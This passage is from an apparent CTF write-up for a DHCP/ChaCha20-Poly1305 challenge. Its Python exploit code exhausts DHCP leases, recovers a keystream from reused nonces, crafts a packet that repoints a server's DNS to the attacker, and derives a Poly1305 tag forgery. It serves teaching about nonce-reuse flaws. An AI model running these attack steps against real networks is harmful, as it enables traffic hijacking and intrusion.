class="hljs-number">24</span>] <span class="hljs-comment"># your own mac</span><br><span class="hljs-comment">#print(&#x27;resp_my_mac&#x27;, resp_my_mac)</span><br>resp_lease_msg = resp[<span class="hljs-number">24</span>:-<span class="hljs-number">8</span>]<br>resp_lease_msg_2byte = resp_lease_msg[:<span class="hljs-number">2</span>] <span class="hljs-comment"># 02</span><br>resp_lease_msg_ct = resp_lease_msg[<span class="hljs-number">2</span>:-<span class="hljs-number">56</span>]<br>resp_lease_msg_tag = resp_lease_msg[-<span class="hljs-number">56</span>:-<span class="hljs-number">24</span>] <span class="hljs-comment"># 16 bytes tag</span><br>resp_lease_msg_modified_nonce = resp_lease_msg[-<span class="hljs-number">24</span>:] <span class="hljs-comment"># 12 bytes nonce</span><br>resp_crc32 = resp[-<span class="hljs-number">8</span>:]<br><span class="hljs-comment"># Precompute crc32s on the first usage; or when the dhcp_req_pkt changes in content =&gt; resp_crc32 not in crc32s.keys()</span><br><span class="hljs-keyword">if</span> resp_crc32 <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> crc32s.keys():<br>precompute_crc32(dhcp_req_pkt)<br><span class="hljs-keyword">if</span> flag_print:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;resp_lease_msg&#x27;</span>, resp_lease_msg)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;resp_lease_msg_2byte&#x27;</span>, resp_lease_msg_2byte)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;resp_lease_msg_ct&#x27;</span>, resp_lease_msg_ct)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;resp_lease_msg_tag&#x27;</span>, resp_lease_msg_tag)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;resp_lease_msg_modified_nonce&#x27;</span>, resp_lease_msg_modified_nonce)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;resp_crc32&#x27;</span>, resp_crc32, <span class="hljs-string">&#x27;, associated IP:&#x27;</span>, crc32s[resp_crc32])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Got IP:&#x27;</span>, crc32s[resp_crc32])<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>.fromhex(resp_lease_msg_ct), <span class="hljs-built_in">bytes</span>.fromhex(resp_lease_msg_tag), <span class="hljs-built_in">bytes</span>.fromhex(resp_lease_msg_modified_nonce), crc32s[resp_crc32] <span class="hljs-comment">#.split(&#x27;.&#x27;)[-1]</span><br></code></pre></td></tr></table></figure><p>Remembering that the IP <code>192.168.1.1</code> is static to the gateway, <code>192.168.1.2</code> is assigned to <code>rngserver_0</code>, and <code>192.168.1.3</code> is assigned to the <strong>FlagServer</strong>, we need to request leases for all the remaining unassigned IP addresses ending in a number of the range [4 .. 63]. These 60 requests will consume all the remaining unassigned IP addresses. If we now request an additional 61th IP address, we’ll kick out the <code>rngserver_0</code> from the list of leases:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>server = <span class="hljs-string">&#x27;dhcppp.chal.pwni.ng&#x27;</span> <span class="hljs-comment"># remote service</span><br>port = <span class="hljs-number">1337</span><br>conn = remote(server, port)<br><br><span class="hljs-built_in">print</span>(conn.readline().decode())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;== FINISHED SERVER BOOT ==&#x27;</span>)<br><br><span class="hljs-comment"># request enough IPs to remove the &#x27;rngserver_0&#x27; from the list of leased IPs...:</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Cycling through some IPs ...&#x27;</span>)<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">61</span>):<br>_, _, _, ip = request_ip_from_dhcp(<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;No more &quot;rngserver&quot; in the list of leased IPs&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Now the lavalamp always returns &quot;sha256(RNG_INIT)!&quot;&#x27;</span>)<br><span class="hljs-comment"># next IP will end in &#x27;.3&#x27;</span><br></code></pre></td></tr></table></figure><p>Thus form now on, we can assume a static primary nonce with the value of <code>sha256(RNG_INIT)</code>, as long as we don’t hide the string <code>rngserver</code> in any future device name.</p><p>Considering that the content of the <strong>DHCP offer message</strong> - which is the part, that will get encrypted - has 19 out of their 20 first bytes fixed and we can control the subsequent bytes, we actually can manipulate the first 32 bytes of this message to pull of a <strong>key and none reuse attack</strong>, especially since we can indirectly control the one remaining byte, which in fact is the last octet of the leased ip address, which we just need to cycle through all the other IP addresses again, as we’ve done before.</p><h4 id="4-2-Forge-a-message-to-the-FlagServer-to-override-their-DNS-server-entries"><a href="#4-2-Forge-a-message-to-the-FlagServer-to-override-their-DNS-server-entries" class="headerlink" title="4.2. Forge a message to the FlagServer to override their DNS-server entries"></a>4.2. Forge a message to the <strong>FlagServer</strong> to override their DNS-server entries</h4><h4 id="4-2-1-Craft-the-desired-packet"><a href="#4-2-1-Craft-the-desired-packet" class="headerlink" title="4.2.1. Craft the desired packet"></a>4.2.1. Craft the desired packet</h4><p>We’ll focus on forging a packet that leases the IP address <code>192.168.1.3</code> (arbitrarily-chosen) and has the following structure for reasons that will become clear later on:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">own_ip_address = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> <span class="hljs-comment"># Change this to your own public IP address, which hosts your DNS and web server.</span><br>ip_dot_3 = <span class="hljs-string">&#x27;192.168.1.3&#x27;</span><br>gateway_ip = <span class="hljs-string">&#x27;192.168.1.1&#x27;</span><br><br>pkt3 = <span class="hljs-built_in">bytearray</span>(<br><span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ip.split(<span class="hljs-string">&quot;.&quot;</span>)]) +<br><span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> gateway_ip.split(<span class="hljs-string">&quot;.&quot;</span>)]) +<br><span class="hljs-built_in">bytes</span>([<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>]) +<br><span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> own_ip_address.split(<span class="hljs-string">&quot;.&quot;</span>)]) +<br><span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> own_ip_address.split(<span class="hljs-string">&quot;.&quot;</span>)]) +<br><span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">12</span> +<br><span class="hljs-string">b&#x27;\x02&#x27;</span>*<span class="hljs-number">15</span> +<br><span class="hljs-string">b&quot;\x00&quot;</span><br>)<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(pkt3) == <span class="hljs-number">48</span>)<br></code></pre></td></tr></table></figure><h4 id="4-2-2-Encrypt-the-desired-packet"><a href="#4-2-2-Encrypt-the-desired-packet" class="headerlink" title="4.2.2. Encrypt the desired packet"></a>4.2.2. Encrypt the desired packet</h4><p>To encrypt this packet <code>pkt3</code>, we’ll need a <strong>KeyStream</strong> of length greater or equal to 48.</p><p>Because <strong>ChaCha20</strong> is just an XOR encryption using the <strong>KeyStream</strong> as its XOR key, we can perform a <strong>known-plaintext attack</strong> against the encrypted packets from the <strong>DhcpServer</strong>, allowing us to recover the relevant bytes to encrypt <code>pkt3</code> of the <strong>KeyStream</strong> from just a single known plaintext - ciphertext pair.</p><p>To be able to double check our work and because we’re going to need it to forge the tag anyways, let’s get two different plaintext - ciphertext pairs:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python">dhcp_server_mac = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;1b 7d 6f 49 37 c9&quot;</span>)<br>flag_server_mac = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;53 79 82 b5 97 eb&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">byte_xor</span>(<span class="hljs-params">d1, d2</span>):<br><span class="hljs-string">&#x27;&#x27;&#x27;Performs a byte-wise XOR on both data-streams.&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([(a^^b) <span class="hljs-keyword">for</span> a,b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(d1, d2)])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_custom_message_with_dhcp</span>(<span class="hljs-params">custom_message_data</span>):<br><span class="hljs-string">&#x27;&#x27;&#x27;Returns a keystream for a DHCP-offer message&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">global</span> flag_server_mac, dhcp_server_mac<br>dhcp_req_pkt = <span class="hljs-built_in">bytearray</span>(<br>flag_server_mac + <span class="hljs-comment"># src mac</span><br>dhcp_server_mac + <span class="hljs-comment"># dst mac</span><br><span class="hljs-comment"># msg:</span><br><span class="hljs-string">b&#x27;\x01&#x27;</span> + <span class="hljs-comment"># DHCP request</span><br>custom_message_data + <span class="hljs-comment"># rest of msg</span><br><span class="hljs-string">b&#x27;\x00&#x27;</span><br>)<br>ct, tag, nonce, ip = request_ip_from_dhcp(<span class="hljs-literal">True</span>, dhcp_req_pkt) <span class="hljs-comment"># IP: *.*.*.3</span><br>packet = <span class="hljs-built_in">bytearray</span>(<br><span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ip.split(<span class="hljs-string">&quot;.&quot;</span>)]) +<br><span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;192.168.1.1&quot;</span>.split(<span class="hljs-string">&quot;.&quot;</span>)]) +<br><span class="hljs-built_in">bytes</span>([<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>]) + <span class="hljs-comment"># subnet mask</span><br><span class="hljs-built_in">bytes</span>([<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>]) + <span class="hljs-comment"># dns server 1</span><br><span class="hljs-built_in">bytes</span>([<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>]) + <span class="hljs-comment"># dns server 2</span><br>dhcp_req_pkt[<span class="hljs-number">12</span>+<span class="hljs-number">1</span>:] +<br><span class="hljs-string">b&quot;\x00&quot;</span><br>)<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(packet) == <span class="hljs-number">48</span>)<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(ct) == <span class="hljs-number">48</span>)<br>key_stream = byte_xor(ct, packet)<br><span class="hljs-keyword">return</span> key_stream, packet, ct, tag, nonce, ip<br><br><span class="hljs-comment"># lease an IP for the FlagServer and get a KeyStream of specified length for the specified IP</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Reading key_stream for IP 192.168.1.3 with custom message #1&#x27;</span>)<br>_, pkt1, ct1, tag1, nonce1, _ = encrypt_custom_message_with_dhcp((<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">12</span>) + (<span class="hljs-string">b&#x27;\x01&#x27;</span>*<span class="hljs-number">14</span>)) <span class="hljs-comment"># uses IP: 192.168.1.3</span><br><br><span class="hljs-comment"># Again, discard lease requests for any undesired IP addresses:</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Cycling through some IPs ...&#x27;</span>)<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">61</span>):<br>_, _, _, ip = request_ip_from_dhcp(<span class="hljs-literal">False</span>)<br><span class="hljs-comment"># next IP to lease: 192.168.1.3</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Reading key_stream for IP 192.168.1.3 with custom message #2&#x27;</span>)<br>_, pkt2, ct2, tag2, nonce2, _ = encrypt_custom_message_with_dhcp((<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">12</span>) + (<span class="hljs-string">b&#x27;\x02&#x27;</span>*<span class="hljs-number">14</span>)) <span class="hljs-comment"># uses IP: 192.168.1.3</span><br></code></pre></td></tr></table></figure><p>Since both the nonce and key are reused, and we know both the plaintext and ciphertext, we can directly recover the keystream via XOR and use this to encrypt arbitrary messages, i.e. <code>pkt3</code>in our use case:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">key1 = byte_xor(pkt1, ct1)<br>key2 = byte_xor(pkt2, ct2)<br><span class="hljs-keyword">assert</span>(key1 == key2)<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(key1) == <span class="hljs-number">48</span>)<br>key = key1<br><br>ct3 = byte_xor(pkt3, key)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;ct3 = <span class="hljs-subst">&#123;ct3.<span class="hljs-built_in">hex</span>()&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="4-3-Attempt-to-forge-the-tag-for-the-encrypted-message-compute-the-corresponding-checksum-and-send-the-message-to-the-FlagServer"><a href="#4-3-Attempt-to-forge-the-tag-for-the-encrypted-message-compute-the-corresponding-checksum-and-send-the-message-to-the-FlagServer" class="headerlink" title="4.3. Attempt to forge the tag for the encrypted message, compute the corresponding checksum and send the message to the FlagServer"></a>4.3. Attempt to forge the <strong>tag</strong> for the encrypted message, compute the corresponding <strong>checksum</strong> and send the message to the <strong>FlagServer</strong></h4><p>This section addresses the following question: Given the Poly1305 authentication tags <code>tag1, tag2</code> for 2 known, distinct messages <code>msg1, msg2</code> which are MAC’ed with the same secret 32-byte Poly1305 key <code>(r,s)</code>, how can we recover <code>(r,s)</code> to forge arbitrary messages?</p><p>To implement the Poly1305 key&#x2F;nonce reuse forgery attack, we used the following references:</p><ol><li>The Poly1305 Wikipedia page (<a href="https://en.wikipedia.org/wiki/Poly1305]">here</a>)</li><li>The ChaCha20-Poly1305 Wikipedia Page (<a href="https://en.wikipedia.org/wiki/ChaCha20-Poly1305">here</a>)</li><li>RFC 7539, the specification for ChaCha20 and Poly1305 (<a href="https://datatracker.ietf.org/doc/html/rfc7539#section-2.8">here</a>)</li><li>This Crypto Stack Exchange post (poncho’s answer) (<a href="https://crypto.stackexchange.com/questions/83629/forgery-attack-on-poly1305-when-the-key-and-nonce-reused">here</a>)</li><li>The PyCryptodome library’s implementation of ChaCha20-Poly1305 and Poly1305 (<a href="https://github.com/Legrandin/pycryptodome/blob/master/lib/Crypto/Cipher/ChaCha20_Poly1305.py">here</a> and <a href="https://github.com/Legrandin/pycryptodome/blob/master/lib/Crypto/Hash/Poly1305.py">here</a>)</li></ol><p>From Ref. 2, we can see the detailed structure of the ChaCha20-Poly1305 AEAD algorithm:<br><img src="/../images/plaid24/ChaCha20-Poly1305.jpg" alt="chacha20_poly1305"></p><p>ChaCha20 is used to generate a keystream that is XORed with the plaintext to produce the ciphertext. The ciphertext (C) and the associated data (AD) are then authenticated using Poly1305 to provide an authentication tag to ensure integrity. Poly1305 takes as its input a message with the following field structure: <code>AD || pad(AD) || C || pad(C) || len(AD) || len(C)</code>. The server code in this challenge doesn’t use any AD, so in our scenario we only have <code>C || pad(C) || len(AD) || len(C)</code>. For the forgery attack to work, we need two messages encrypted&#x2F;authenticated with the same nonce&#x2F;key - and we already have these from Section 4.2.2! Let’s use the ciphertexts to construct the full input messages to the Poly1305 authenticator:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">msg1 = ct1 + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span> + long_to_bytes(<span class="hljs-built_in">len</span>(ct1)) + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">7</span><br>msg2 = ct2 + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span> + long_to_bytes(<span class="hljs-built_in">len</span>(ct2)) + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">7</span><br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(msg1) % <span class="hljs-number">16</span> == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(msg2) % <span class="hljs-number">16</span> == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(msg1) == <span class="hljs-built_in">len</span>(msg2))<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(msg1) == <span class="hljs-number">64</span>)<br></code></pre></td></tr></table></figure><p>Now, with the messages <code>msg1, msg2</code> and tags <code>tag1, tag2</code>, how can we recover the secret 32-byte Poly1305 key <code>(r,s)</code>? From <a href="https://en.wikipedia.org/wiki/Poly1305#Use_as_a_one-time_authenticator">this section of the Wikipedia page on Poly1305</a> (Ref. 1 above) and also the crypto stack exchange answer (Ref. 4 above), we learn that reuse of the same <code>(r,s)</code> for <code>msg1 != msg2</code> gives us</p><math xmlns="http://www.w3.org/1998/Math/MathML" display="block">  <mi>t</mi>  <mi>a</mi>  <msub>    <mi>g</mi>    <mn>1</mn>  </msub>  <mo>=</mo>  <mo stretchy="false">(</mo>  <mi>P</mi>  <mi>o</mi>  <mi>l</mi>  <mi>y</mi>  <msub>    <mn>1305</mn>    <mi>r</mi>  </msub>  <mo stretchy="false">(</mo>  <mi>m</mi>  <mi>s</mi>  <msub>    <mi>g</mi>    <mn>1</mn>  </msub>  <mo stretchy="false">)</mo>  <mo>+</mo>  <mi>s</mi>  <mo stretchy="false">)</mo>  <mstyle>    <mspace width="1em"></mspace>  </mstyle>  <mi>m</mi>  <mi>o</mi>  <mi>d</mi>  <mstyle>    <mspace width="1em"></mspace>  </mstyle>  <msup>    <mn>2</mn>    <mrow data-mjx-texclass="ORD">      <mn>128</mn>    </mrow>  </msup>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mo stretchy="false">(</mo>  <mn>1</mn>  <mo stretchy="false">)</mo></math><math xmlns="http://www.w3.org/1998/Math/MathML" display="block">  <mi>t</mi>  <mi>a</mi>  <msub>    <mi>g</mi>    <mn>2</mn>  </msub>  <mo>=</mo>  <mo stretchy="false">(</mo>  <mi>P</mi>  <mi>o</mi>  <mi>l</mi>  <mi>y</mi>  <msub>    <mn>1305</mn>    <mi>r</mi>  </msub>  <mo stretchy="false">(</mo>  <mi>m</mi>  <mi>s</mi>  <msub>    <mi>g</mi>    <mn>2</mn>  </msub>  <mo stretchy="false">)</mo>  <mo>+</mo>  <mi>s</mi>  <mo stretchy="false">)</mo>  <mstyle>    <mspace width="1em"></mspace>  </mstyle>  <mi>m</mi>  <mi>o</mi>  <mi>d</mi>  <mstyle>    <mspace width="1em"></mspace>  </mstyle>  <msup>    <mn>2</mn>    <mrow data-mjx-texclass="ORD">      <mn>128</mn>    </mrow>  </msup>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mo stretchy="false">(</mo>  <mn>2</mn>  <mo stretchy="false">)</mo></math><p>Subtracting the two:</p><math xmlns="http://www.w3.org/1998/Math/MathML" display="block">  <mi>t</mi>  <mi>a</mi>  <msub>    <mi>g</mi>    <mn>1</mn>  </msub>  <mo>&#x2212;</mo>  <mi>t</mi>  <mi>a</mi>  <msub>    <mi>g</mi>    <mn>2</mn>  </msub>  <mo>&#x2261;</mo>  <mi>P</mi>  <mi>o</mi>  <mi>l</mi>  <mi>y</mi>  <msub>    <mn>1305</mn>    <mi>r</mi>  </msub>  <mo stretchy="false">(</mo>  <mi>m</mi>  <mi>s</mi>  <msub>    <mi>g</mi>    <mn>1</mn>  </msub>  <mo stretchy="false">)</mo>  <mo>&#x2212;</mo>  <mi>P</mi>  <mi>o</mi>  <mi>l</mi>  <mi>y</mi>  <msub>    <mn>1305</mn>    <mi>r</mi>  </msub>  <mo stretchy="false">(</mo>  <mi>m</mi>  <mi>s</mi>  <msub>    <mi>g</mi>    <mn>2</mn>  </msub>  <mo stretchy="false">)</mo>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mo stretchy="false">(</mo>  <mi>m</mi>  <mi>o</mi>  <mi>d</mi>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <msup>    <mn>2</mn>    <mrow data-mjx-texclass="ORD">      <mn>128</mn>    </mrow>  </msup>  <mo stretchy="false">)</mo></math><math xmlns="http://www.w3.org/1998/Math/MathML" display="block">  <mi>t</mi>  <mi>a</mi>  <msub>    <mi>g</mi>    <mn>1</mn>  </msub>  <mo>&#x2212;</mo>  <mi>t</mi>  <mi>a</mi>  <msub>    <mi>g</mi>    <mn>2</mn>  </msub>  <mo>&#x2261;</mo>  <mo stretchy="false">(</mo>  <mo stretchy="false">(</mo>  <msubsup>    <mi>c</mi>    <mn>1</mn>    <mn>1</mn>  </msubsup>  <msup>    <mi>r</mi>    <mi>q</mi>  </msup>  <mo>+</mo>  <msubsup>    <mi>c</mi>    <mn>1</mn>    <mn>2</mn>  </msubsup>  <msup>    <mi>r</mi>    <mrow data-mjx-texclass="ORD">      <mi>q</mi>      <mo>&#x2212;</mo>      <mn>1</mn>    </mrow>  </msup>  <mo>+</mo>  <mo>&#x22EF;</mo>  <mo>+</mo>  <msubsup>    <mi>c</mi>    <mn>1</mn>    <mi>q</mi>  </msubsup>  <msup>    <mi>r</mi>    <mn>1</mn>  </msup>  <mo stretchy="false">)</mo>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mo stretchy="false">(</mo>  <mi>m</mi>  <mi>o</mi>  <mi>d</mi>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <msup>    <mn>2</mn>    <mrow data-mjx-texclass="ORD">      <mn>130</mn>    </mrow>  </msup>  <mo stretchy="false">)</mo>  <mo>&#x2212;</mo>  <mn>5</mn>  <mo stretchy="false">)</mo>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mi>m</mi>  <mi>o</mi>  <mi>d</mi>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <msup>    <mn>2</mn>    <mrow data-mjx-texclass="ORD">      <mn>128</mn>    </mrow>  </msup></math><math xmlns="http://www.w3.org/1998/Math/MathML" display="block">  <mo>&#x2212;</mo>  <mo stretchy="false">(</mo>  <mo stretchy="false">(</mo>  <msubsup>    <mi>c</mi>    <mn>2</mn>    <mn>1</mn>  </msubsup>  <msup>    <mi>r</mi>    <mi>q</mi>  </msup>  <mo>+</mo>  <msubsup>    <mi>c</mi>    <mn>2</mn>    <mn>2</mn>  </msubsup>  <msup>    <mi>r</mi>    <mrow data-mjx-texclass="ORD">      <mi>q</mi>      <mo>&#x2212;</mo>      <mn>1</mn>    </mrow>  </msup>  <mo>+</mo>  <mo>&#x22EF;</mo>  <mo>+</mo>  <msubsup>    <mi>c</mi>    <mn>2</mn>    <mi>q</mi>  </msubsup>  <msup>    <mi>r</mi>    <mn>1</mn>  </msup>  <mo stretchy="false">)</mo>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mo stretchy="false">(</mo>  <mi>m</mi>  <mi>o</mi>  <mi>d</mi>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <msup>    <mn>2</mn>    <mrow data-mjx-texclass="ORD">      <mn>130</mn>    </mrow>  </msup>  <mo stretchy="false">)</mo>  <mo>&#x2212;</mo>  <mn>5</mn>  <mo stretchy="false">)</mo>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mi>m</mi>  <mi>o</mi>  <mi>d</mi>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <msup>    <mn>2</mn>    <mrow data-mjx-texclass="ORD">      <mn>128</mn>    </mrow>  </msup></math><p>Which can be rewritten as:</p><math xmlns="http://www.w3.org/1998/Math/MathML" display="block">  <mi>t</mi>  <mi>a</mi>  <msub>    <mi>g</mi>    <mn>1</mn>  </msub>  <mo>&#x2212;</mo>  <mi>t</mi>  <mi>a</mi>  <msub>    <mi>g</mi>    <mn>2</mn>  </msub>  <mo>+</mo>  <msup>    <mn>2</mn>    <mrow data-mjx-texclass="ORD">      <mn>128</mn>    </mrow>  </msup>  <mi>k</mi>  <mo>=</mo>  <mo stretchy="false">(</mo>  <mo stretchy="false">(</mo>  <mo stretchy="false">(</mo>  <msubsup>    <mi>c</mi>    <mn>1</mn>    <mn>1</mn>  </msubsup>  <mo>&#x2212;</mo>  <msubsup>    <mi>c</mi>    <mn>2</mn>    <mn>1</mn>  </msubsup>  <mo stretchy="false">)</mo>  <msup>    <mi>r</mi>    <mi>q</mi>  </msup>  <mo>+</mo>  <mo stretchy="false">(</mo>  <msubsup>    <mi>c</mi>    <mn>1</mn>    <mn>2</mn>  </msubsup>  <mo>&#x2212;</mo>  <msubsup>    <mi>c</mi>    <mn>2</mn>    <mn>2</mn>  </msubsup>  <mo stretchy="false">)</mo>  <msup>    <mi>r</mi>    <mrow data-mjx-texclass="ORD">      <mi>q</mi>      <mo>&#x2212;</mo>      <mn>1</mn>    </mrow>  </msup>  <mo>+</mo>  <mo>&#x22EF;</mo>  <mo>+</mo>  <mo stretchy="false">(</mo>  <msubsup>    <mi>c</mi>    <mn>1</mn>    <mi>q</mi>  </msubsup>  <mo>&#x2212;</mo>  <msubsup>    <mi>c</mi>    <mn>2</mn>    <mi>q</mi>  </msubsup>  <mo stretchy="false">)</mo>  <msup>    <mi>r</mi>    <mn>1</mn>  </msup>  <mo stretchy="false">)</mo>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mo stretchy="false">(</mo>  <mi>m</mi>  <mi>o</mi>  <mi>d</mi>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <mstyle>    <mspace width="0.278em"></mspace>  </mstyle>  <msup>    <mn>2</mn>    <mrow data-mjx-texclass="ORD">      <mn>130</mn>    </mrow>  </msup>  <mo 